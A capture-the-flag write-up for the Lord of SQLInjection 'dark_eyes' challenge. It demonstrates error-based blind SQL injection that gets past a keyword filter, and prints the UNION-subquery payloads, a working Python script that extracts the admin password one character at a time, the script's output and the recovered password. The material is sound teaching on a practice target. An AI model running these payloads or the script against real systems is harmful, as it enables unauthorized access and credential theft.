---
custom_edit_url: null
pagination_next: null
pagination_prev: null
sidebar_position: 22
---

![1](https://github.com/Kunull/Write-ups/assets/110326359/cbd65f64-4c89-44f4-b041-b362993f22dd)

We are provided with the SQL query:

```sql
SELECT id FROM prob_dark_eyes WHERE id='admin' AND pw='{$_GET[pw]}'
```

## Filter:

This challenge filters out the following:
- `col`
- `if`
- `case`
- `when`
- `sleep`
- `benchmark`


This level also exits when an error is invoked instead of revealing the error message.

## Error-based Blind SQL Injection

### ERROR: Subquery returned more than 1 value error

In SQL the subquery can only return one value.

```sql
## Valid:
SELECT id FROM prob_dark_eyes WHERE id='admin' AND pw='' OR (SELECT 1) -- -'

## Invalid:
SELECT id FROM prob_dark_eyes WHERE id='admin' AND pw='' OR (SELECT 1 UNION SELECT 2) -- -'
```

This is the error that we will be exploiting.

### Revealing the password length

If we provide the following URI parameter:

```
?pw=' OR (SELECT 1 UNION SELECT 2 WHERE id='admin' AND length(pw)=1) -- -
```

The resultant query becomes:

```sql
SELECT id FROM prob_dark_eyes WHERE id='admin' AND pw='' OR (SELECT 1 UNION SELECT 2 WHERE id='admin' AND length(pw)=1) -- -'
```

The above SQL query includes the subquery `(SELECT 1 UNION SELECT 2 where id='admin' and length(pw)=1)` which returns two values if the `length(pw)=1` for `id='admin'`. This would invoke an error and cause the challenge to exit.

![2](https://github.com/Kunull/Write-ups/assets/110326359/29f2c0b3-d400-4043-8ce0-5a0c461edf1d)

Since the challenge did not exit, it means that the subquery only returned one value `SELECT 1`. This tells us that the length of the `pw` for `id='admin'` is more than 1.

If we keep increasing the length and provide the following URI parameter:

```
?pw=' OR (SELECT 1 UNION SELECT 2 WHERE id='admin' AND length(pw)=8) -- -
```

The resultant query becomes:

```sql
SELECT id FROM prob_dark_eyes WHERE id='admin' AND pw='' OR (SELECT 1 UNION SELECT 2 WHERE id='admin' AND length(pw)=8) -- -'
```

![3](https://github.com/Kunull/Write-ups/assets/110326359/fc84a7c5-6e2b-48c9-98e0-3c568896f8ed)

The subquery returned two values `SELECT 1 UNION SELECT 2` because the length of `pw` for `id='admin'` is 8. This caused an error, causing the challenge to exit.

### Leaking the password

Next, we can leak the password byte by byte using the `substr()` function.

#### `substr()`

If we provide the following URI parameter:

```
?pw=' OR (SELECT 1 UNION SELECT 2 WHERE id='admin' AND substr(pw, 1, 1)='0') -- -
```

The resultant query will be:

```sql
SELECT id FROM prob_dark_eyes WHERE id='admin' AND pw='' OR (SELECT 1 UNION SELECT 2 WHERE id='admin' AND substr(pw, 1, 1)='0') -- -'
```

![4](https://github.com/Kunull/Write-ups/assets/110326359/9b457365-e10b-441b-8118-a7b79af680c8)

Since the challenge did not exit, it means that the subquery only returned one value `SELECT 1`. This tells us that the first character of the `pw` for `id='admin'` is not `0`.

We can try other characters moving up to the following:

```
?pw=' OR (SELECT 1 UNION SELECT 2 WHERE id='admin' AND substr(pw, 1, 1)='5') -- -
```

The resultant query will be:

```sql
SELECT id FROM prob_dark_eyes WHERE id='admin' AND pw='' OR (SELECT 1 UNION SELECT 2 WHERE id='admin' AND substr(pw, 1, 1)='5') -- -'
```

![5](https://github.com/Kunull/Write-ups/assets/110326359/e62cdc7f-f0c7-4e9e-9177-e345970208a6)

The subquery returned two values `SELECT 1 UNION SELECT 2` because the first character of `pw` for `id='admin'` is ``5`. This caused an error, causing the challenge to exit.

We can keep repeating this process until we get all the eight characters of the `admin` password:

```
5a2f5d3c
```

### Script

```python title="dark_eyes_script.py"
import requests
import urllib.parse
import string

cookies = {'PHPSESSID': 'rvrb7p6vumnf7hu5ukb8f70gj8'}
url = "https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php"
password_length = 0

for x in range(0, 100):
  payload = f"' OR (SELECT 1 UNION SELECT 2 WHERE id='admin' AND length(pw)={x}) -- -"
  encoded_payload = urllib.parse.quote_plus(payload)
  full_url = f"{url}?pw={encoded_payload}"
    
  response = requests.get(full_url, cookies=cookies)
    
  if "prob_dark_eyes" not in response.text:
    password_length = x
    break

print()    
print(f"[!] Payload: ?pw={payload}")
print(f"[!] Payload (URL encoded): ?pw={encoded_payload}")
print(f"[!] Password length: {password_length}")

password = ""
searchspace = string.digits + string.ascii_letters

for index in range(1, password_length + 1):
  for char in searchspace:
    payload = f"' OR (SELECT 1 UNION SELECT 2 WHERE id='admin' AND substr(pw, {index}, 1)='{char}') -- -"
    encoded_payload = urllib.parse.quote_plus(payload)
    full_url = f"{url}?pw={encoded_payload}"

    response = requests.get(full_url, cookies=cookies)

    if "prob_dark_eyes" not in response.text:
      password += char
      print()
      print(f"[+] Payload: ?pw={payload}")
      print(f"[+] Payload (URL encoded): ?pw={encoded_payload}")
      print(f"[+] Character at index {index}: {char}")
      break

print()
print(f"[!] Extracted password: {password}")
print(f"[!] Final payload: ?pw={password}")
```

```
$ python .\dark_eyes_script.py

[!] Payload: ?pw=' OR (SELECT 1 UNION SELECT 2 WHERE id='admin' AND length(pw)=8) -- -
[!] Payload (URL encoded): ?pw=%27+OR+%28SELECT+1+UNION+SELECT+2+WHERE+id%3D%27admin%27+AND+length%28pw%29%3D8%29+--+-
[!] Password length: 8

[+] Payload: ?pw=' OR (SELECT 1 UNION SELECT 2 WHERE id='admin' AND substr(pw, 1, 1)='5') -- -
[+] Payload (URL encoded): ?pw=%27+OR+%28SELECT+1+UNION+SELECT+2+WHERE+id%3D%27admin%27+AND+substr%28pw%2C+1%2C+1%29%3D%275%27%29+--+-
[+] Character at index 1: 5

[+] Payload: ?pw=' OR (SELECT 1 UNION SELECT 2 WHERE id='admin' AND substr(pw, 2, 1)='a') -- -
[+] Payload (URL encoded): ?pw=%27+OR+%28SELECT+1+UNION+SELECT+2+WHERE+id%3D%27admin%27+AND+substr%28pw%2C+2%2C+1%29%3D%27a%27%29+--+-
[+] Character at index 2: a

[+] Payload: ?pw=' OR (SELECT 1 UNION SELECT 2 WHERE id='admin' AND substr(pw, 3, 1)='2') -- -
[+] Payload (URL encoded): ?pw=%27+OR+%28SELECT+1+UNION+SELECT+2+WHERE+id%3D%27admin%27+AND+substr%28pw%2C+3%2C+1%29%3D%272%27%29+--+-
[+] Character at index 3: 2

[+] Payload: ?pw=' OR (SELECT 1 UNION SELECT 2 WHERE id='admin' AND substr(pw, 4, 1)='f') -- -
[+] Payload (URL encoded): ?pw=%27+OR+%28SELECT+1+UNION+SELECT+2+WHERE+id%3D%27admin%27+AND+substr%28pw%2C+4%2C+1%29%3D%27f%27%29+--+-
[+] Character at index 4: f

[+] Payload: ?pw=' OR (SELECT 1 UNION SELECT 2 WHERE id='admin' AND substr(pw, 5, 1)='5') -- -
[+] Payload (URL encoded): ?pw=%27+OR+%28SELECT+1+UNION+SELECT+2+WHERE+id%3D%27admin%27+AND+substr%28pw%2C+5%2C+1%29%3D%275%27%29+--+-
[+] Character at index 5: 5

[+] Payload: ?pw=' OR (SELECT 1 UNION SELECT 2 WHERE id='admin' AND substr(pw, 6, 1)='d') -- -
[+] Payload (URL encoded): ?pw=%27+OR+%28SELECT+1+UNION+SELECT+2+WHERE+id%3D%27admin%27+AND+substr%28pw%2C+6%2C+1%29%3D%27d%27%29+--+-
[+] Character at index 6: d

[+] Payload: ?pw=' OR (SELECT 1 UNION SELECT 2 WHERE id='admin' AND substr(pw, 7, 1)='3') -- -
[+] Payload (URL encoded): ?pw=%27+OR+%28SELECT+1+UNION+SELECT+2+WHERE+id%3D%27admin%27+AND+substr%28pw%2C+7%2C+1%29%3D%273%27%29+--+-
[+] Character at index 7: 3

[+] Payload: ?pw=' OR (SELECT 1 UNION SELECT 2 WHERE id='admin' AND substr(pw, 8, 1)='c') -- -
[+] Payload (URL encoded): ?pw=%27+OR+%28SELECT+1+UNION+SELECT+2+WHERE+id%3D%27admin%27+AND+substr%28pw%2C+8%2C+1%29%3D%27c%27%29+--+-
[+] Character at index 8: c

[!] Extracted password: 5a2f5d3c
[!] Final payload: ?pw=5a2f5d3c
```


If we provide the following URI parameter:

```
?pw=5a2f5d3c
```

The resultant query becomes:

```sql
SELECT id FROM prob_dark_eyes WHERE id='admin' AND pw='5a2f5d3c'
```

![6](https://github.com/Kunull/Write-ups/assets/110326359/e6a9c9b4-8d34-4c6a-9bf4-3a9538a4cb5d)
